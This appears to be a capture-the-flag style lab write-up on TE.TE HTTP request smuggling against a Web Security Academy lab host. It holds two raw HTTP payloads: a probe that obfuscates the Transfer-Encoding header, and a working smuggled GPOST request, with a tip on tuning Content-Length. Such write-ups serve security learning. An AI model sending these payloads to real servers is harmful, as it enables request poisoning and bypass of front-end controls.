# TE.TE Request smuggling (true TE.CL)

![image.png](Detecting%20TE%20TE%20vulnerability/image.png)

The scheme of TE.TE attack:

![image.png](TE%20TE%20Request%20smuggling%20(true%20TE%20CL)/image.png)

![image.png](TE%20TE%20Request%20smuggling%20(true%20TE%20CL)/image%201.png)

To perform an attack, we will take probing payload 2, and obfuscate the Transfer-Encoding header by adding another one:

```xml
POST / HTTP/1.1
Host: 0a23005403803d938088674b000c00e9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: foo

0

X
```

It’s causing request timeout

![image.png](TE%20TE%20Request%20smuggling%20(true%20TE%20CL)/image%202.png)

Confirming TE.TE:

![image.png](TE%20TE%20Request%20smuggling%20(true%20TE%20CL)/image%203.png)

The final attack scheme is following [TE.CL](http://TE.CL) attack:

![image.png](TE%20TE%20Request%20smuggling%20(true%20TE%20CL)/image%204.png)

```xml
POST / HTTP/1.1
Host: 0a23005403803d938088674b000c00e9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: foo

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

123
0

```

Note: Content-Length of a smuggled request is the actual size(10) + 1, so that a normal request gets appended.

![image.png](TE%20TE%20Request%20smuggling%20(true%20TE%20CL)/image%205.png)

![image.png](TE%20TE%20Request%20smuggling%20(true%20TE%20CL)/image%206.png)

Solved

![image.png](TE%20TE%20Request%20smuggling%20(true%20TE%20CL)/image%207.png)